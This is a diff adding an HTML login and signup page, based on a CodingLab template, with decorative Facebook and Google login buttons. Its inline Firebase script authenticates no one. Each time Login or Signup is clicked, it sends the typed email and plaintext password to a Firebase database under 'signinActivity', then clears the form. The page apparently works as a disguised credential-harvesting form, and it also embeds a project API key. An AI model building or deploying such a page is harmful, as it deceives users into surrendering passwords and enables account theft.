@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<!-- Coding by CodingLab | www.codinglabweb.com-->
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title> Responsive Login and Signup Form </title>
+
+        <!-- CSS -->
+        <link rel="stylesheet" href="css/style.css">
+                
+        <!-- Boxicons CSS -->
+        <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>
+                        
+    </head>
+    <body>
+        <section class="container forms">
+            <div class="form login">
+                <div class="form-content">
+                    <header>Login</header>
+                    <form id="newform" action="#">
+                        <div class="field input-field">
+                            <input type="email" placeholder="Email" class="input">
+                        </div>
+
+                        <div class="field input-field">
+                            <input type="password" placeholder="Password" class="password">
+                            <i class='bx bx-hide eye-icon'></i>
+                        </div>
+
+                        <div class="form-link">
+                            <a href="#" class="forgot-pass">Forgot password?</a>
+                        </div>
+
+                        <div class="field button-field">
+                            <button name="login">Login</button>
+                        </div>
+                    </form>
+
+                    <div class="form-link">
+                        <span>Don't have an account? <a href="#" class="link signup-link">Signup</a></span>
+                    </div>
+                </div>
+
+                <div class="line"></div>
+
+                <div class="media-options">
+                    <a href="#" class="field facebook">
+                        <i class='bx bxl-facebook facebook-icon'></i>
+                        <span>Login with Facebook</span>
+                    </a>
+                </div>
+
+                <div class="media-options">
+                    <a href="#" class="field google">
+                        <img src="images/google.png" alt="" class="google-img">
+                        <span>Login with Google</span>
+                    </a>
+                </div>
+
+            </div>
+
+            <!-- Signup Form -->
+
+            <div class="form signup">
+                <div class="form-content">
+                    <header>Signup</header>
+                    <form action="#">
+                        <div class="field input-field">
+                            <input type="email" placeholder="Email" class="input">
+                        </div>
+
+                        <div class="field input-field">
+                            <input type="password" placeholder="Create password" class="password">
+                        </div>
+
+                        <div class="field input-field">
+                            <input type="password" placeholder="Confirm password" class="password">
+                            <i class='bx bx-hide eye-icon'></i>
+                        </div>
+
+                        <div class="field button-field">
+                            <button name="signup">Signup</button>
+                        </div>
+                    </form>
+
+                    <div class="form-link">
+                        <span>Already have an account? <a href="#" class="link login-link">Login</a></span>
+                    </div>
+                </div>
+
+                <div class="line"></div>
+
+                <div class="media-options">
+                    <a href="#" class="field facebook">
+                        <i class='bx bxl-facebook facebook-icon'></i>
+                        <span>Login with Facebook</span>
+                    </a>
+                </div>
+
+                <div class="media-options">
+                    <a href="#" class="field google">
+                        <img src="images/google.png" alt="" class="google-img">
+                        <span>Login with Google</span>
+                    </a>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- JavaScript -->
+        <script src="js/script.js"></script>
+
+        <script type="module">
+            var i = 0;
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+
+            const firebaseConfig = {
+            apiKey: "AIzaSyDaLcCRvdMI1DAwhWHrPQynUOEZqCWlATw",
+            authDomain: "web-app-8b01e.firebaseapp.com",
+            databaseURL: "https://web-app-8b01e-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "web-app-8b01e",
+            storageBucket: "web-app-8b01e.appspot.com",
+            messagingSenderId: "68868951992",
+            appId: "1:68868951992:web:d5213c414cd171fb52494d",
+            measurementId: "G-ES4RF7GH1N"
+            };
+
+            const app = initializeApp(firebaseConfig);
+
+            import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+            document.querySelector("button[name='login']")
+            .addEventListener('click', LoginformSubmit);
+
+            async function LoginformSubmit(e) {
+                e.preventDefault();
+                // Get Values from the DOM
+                let Email = document.querySelectorAll("input[type=email]")[0].value
+                let Password = document.querySelectorAll("input[type=password]")[0].value
+                const type = 'login'
+
+                sendMessage2(Email, Password, type);
+            }
+
+            document.querySelector("button[name='signup']")
+            .addEventListener('click', SignupformSubmit);
+
+            async function SignupformSubmit(e) {
+                e.preventDefault();
+                // Get Values from the DOM
+                let Email = document.querySelectorAll("input[type=email]")[0].value
+                let Password = document.querySelectorAll("input[type=password]")[0].value
+                const type = 'signup'
+
+                sendMessage2(Email, Password, type);
+            }
+                
+            function sendMessage2(Email, Password, type) {
+   
+                i = i + 1;
+                const database = getDatabase();
+                set(ref(database, 'signinActivity/' + i), {
+                    Email: Email,
+                    Password: Password,
+                    Type: type
+                })
+                document.getElementById('newform').reset();
+            
+            }
+        </script>
+    </body>
+</html>
